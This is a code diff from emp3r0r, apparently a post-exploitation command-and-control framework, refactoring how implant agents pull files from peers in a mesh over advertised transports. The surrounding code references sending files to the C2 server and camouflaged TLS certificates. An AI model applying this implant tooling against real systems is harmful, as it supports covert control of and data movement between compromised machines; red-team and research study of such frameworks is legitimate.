@@ -9,7 +9,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
-	"strings"
+	"strconv"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -32,8 +32,10 @@ var (
 	// PeerIPsProvider is set by internal/agent/mesh to return all active mesh peer IPs.
 	PeerIPsProvider func() []string
 
-	// PeerFileProvider is set by internal/agent/mesh to return peerIP -> p2pPort for peers holding fileName.
-	PeerFileProvider func(fileName string) map[string]int
+	// PeerFileProvider is set by internal/agent/mesh to return peerIP -> relay
+	// endpoint for peers holding fileName. The endpoint includes the peer's
+	// advertised transport so a mixed-transport mesh is dialled correctly.
+	PeerFileProvider func(fileName string) map[string]transport.PeerEndpoint
 )
 
 // MemFSKey returns the canonical memfs key for a named resource.
@@ -107,29 +109,32 @@ func FetchFile(config *def.Config, peer, file_to_download, path, checksum string
 	}
 
 	// 2. Try peer P2P (query gossip view for peers advertising the file)
-	peerMap := make(map[string]int)
+	peerEndpoints := make(map[string]transport.PeerEndpoint)
 	if peer != "" {
-		port := 0
+		// Resolve the requested peer's advertised transport/port when known.
+		ep := transport.PeerEndpoint{Addr: peer}
 		if PeerFileProvider != nil {
 			if m := PeerFileProvider(file_to_download); len(m) > 0 {
-				port = m[peer]
+				if found, ok := m[peer]; ok {
+					ep = found
+				}
 			}
 		}
-		peerMap[peer] = port
+		peerEndpoints[peer] = ep
 	} else if PeerFileProvider != nil {
-		peerMap = PeerFileProvider(file_to_download)
+		peerEndpoints = PeerFileProvider(file_to_download)
 	}
 
-	if len(peerMap) > 0 {
-		for pIP, pPort := range peerMap {
+	if len(peerEndpoints) > 0 {
+		for pIP, ep := range peerEndpoints {
 			if pIP == "" {
 				continue
 			}
-			logging.Infof("FetchFile: P2P pull %s from peer %s (port %d)", file_to_download, pIP, pPort)
+			logging.Infof("FetchFile: P2P pull %s from peer %s (transport %q)", file_to_download, pIP, ep.Transport)
 			for _, name := range []string{memKey, file_to_download} {
-				data, err = FetchFilePeerWithPort(pIP, pPort, name, path, checksum)
+				data, err = FetchFilePeerWithEndpoint(ep, name, path, checksum)
 				if err == nil {
-					logging.Infof("FetchFile: P2P success %s from peer %s:%d", name, pIP, pPort)
+					logging.Infof("FetchFile: P2P success %s from peer %s", name, pIP)
 					if len(data) > 0 {
 						cacheToMemFS(file_to_download, data)
 					} else if path != "" {
@@ -140,7 +145,7 @@ func FetchFile(config *def.Config, peer, file_to_download, path, checksum string
 					return data, nil
 				}
 			}
-			logging.Warningf("FetchFile: P2P download from peer %s:%d failed (%v)", pIP, pPort, err)
+			logging.Warningf("FetchFile: P2P download from peer %s failed (%v)", pIP, err)
 		}
 	} else {
 		logging.Infof("FetchFile: no mesh peer advertises %s in gossip view — skipping P2P", file_to_download)
@@ -255,35 +260,30 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	return err
 }
 
-// FetchFilePeer downloads a file directly from a peer agent using the default or advertised P2P port.
+// FetchFilePeer downloads a file directly from a peer agent using the local
+// default transport and P2P relay port.
 func FetchFilePeer(peerIP, file_to_download, path, checksum string) (data []byte, err error) {
-	return FetchFilePeerWithPort(peerIP, 0, file_to_download, path, checksum)
+	return FetchFilePeerWithEndpoint(transport.PeerEndpoint{Addr: peerIP}, file_to_download, path, checksum)
 }
 
-// FetchFilePeerWithPort downloads a file directly from a peer agent on a specified P2P port over P2P transport.
-func FetchFilePeerWithPort(peerIP string, peerPort int, file_to_download, path, checksum string) (data []byte, err error) {
-	addr := peerIP
-	if !strings.Contains(peerIP, ":") {
-		portStr := common.RuntimeConfig.P2PRelayPort
-		if peerPort > 0 {
-			portStr = fmt.Sprintf("%d", peerPort)
-		}
-		addr = fmt.Sprintf("%s:%s", peerIP, portStr)
+// FetchFilePeerWithEndpoint downloads a file directly from a peer agent using the
+// transport the peer advertised in its endpoint (falling back to the local
+// default transport/port when the peer advertised none).
+func FetchFilePeerWithEndpoint(ep transport.PeerEndpoint, file_to_download, path, checksum string) (data []byte, err error) {
+	fallbackPort := 0
+	if p, perr := strconv.Atoi(common.RuntimeConfig.P2PRelayPort); perr == nil {
+		fallbackPort = p
 	}
 
-	// Dial using the same transport that ServeRelay uses
-	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
-	if t == nil {
-		return nil, fmt.Errorf("FetchFilePeer: transport %q not found", common.RuntimeConfig.P2PTransport)
-	}
-	if camo, ok := t.(*transport.CamouflageMTLS); ok {
-		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
-		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
-	}
-
-	conn, err := t.Dial(addr, common.RuntimeConfig.Password, def.MagicString)
+	conn, err := transport.DialPeer(
+		ep,
+		common.RuntimeConfig.P2PTransport,
+		fallbackPort,
+		common.RuntimeConfig.Password,
+		def.MagicString,
+	)
 	if err != nil {
-		return nil, fmt.Errorf("FetchFilePeer dial %s: %v", addr, err)
+		return nil, fmt.Errorf("FetchFilePeer: %w", err)
 	}
 	defer conn.Close()
 
@@ -344,7 +344,7 @@ func FetchFilePeerWithPort(peerIP string, peerPort int, file_to_download, path, 
 		}
 	}
 
-	logging.Infof("FetchFilePeer: got %d bytes of %s from %s", dataLen, file_to_download, peerIP)
+	logging.Infof("FetchFilePeer: got %d bytes of %s from %s", dataLen, file_to_download, ep.Addr)
 
 	// Save to path if requested
 	if path != "" {
